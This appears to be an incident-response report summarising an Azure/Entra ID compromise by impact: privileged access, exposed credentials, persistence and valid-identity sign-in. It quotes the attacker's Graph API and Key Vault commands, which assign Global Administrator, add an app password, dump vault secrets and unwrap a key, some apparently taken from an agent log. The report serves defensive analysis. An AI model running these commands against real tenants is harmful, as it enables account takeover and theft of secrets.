Impact
  [x] Privileged access obtained
      A principal was given a privileged role or permission, or a route to root on a host was opened. Treat what it governs as under attacker control until reviewed.
      targets  role roleTemplateId=62e90394-69f5-4237-9190-012177145e10; principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp); principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d
      what     GlobalAdministratorAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref" -Body $member (20261015_091000_step03_escalate.ps1:4)
               AppRoleAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments" -Body $grant (20261015_091000_step03_escalate.ps1:5)
               AppRoleAssignment: POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)
      basis    GlobalAdministratorAssignment, AppRoleAssignment
  [x] Credentials exposed
      Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker. Affected: corpvault.vault.azure.net, finvault.vault.azure.net.
      targets  vault $v; vault corpvault; secret db-password; vault finvault; secret api-key; key kek
      what     KeyVaultSecretRead: az keyvault secret list --vault-name "$v" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)
               KeyVaultSecretRead: curl -s -H "Authorization: Bearer $KV" "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)
               KeyVaultSecretRead: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)
               KeyVaultKeyUnwrap: curl -s -X POST -H "Authorization: Bearer $KV" -d @wrapped.json "https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4" (20261015_093000_step05_vault.sh:8)
      basis    KeyVaultSecretRead, KeyVaultKeyUnwrap
  [x] Persistence established
      A way back in was created: a credential, an account, a key, a scheduled job, a service or a start-up entry. Access survives a password reset.
      targets  application 66666666-7777-4888-9999-000000000000
      what     AppCredentialAddition: Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword" -Body '{}' (20261015_091000_step03_escalate.ps1:3)
      basis    AppCredentialAddition
  [x] Valid identity used
      The attacker signed in as an identity that exists. Sign-in controls did not stop it.
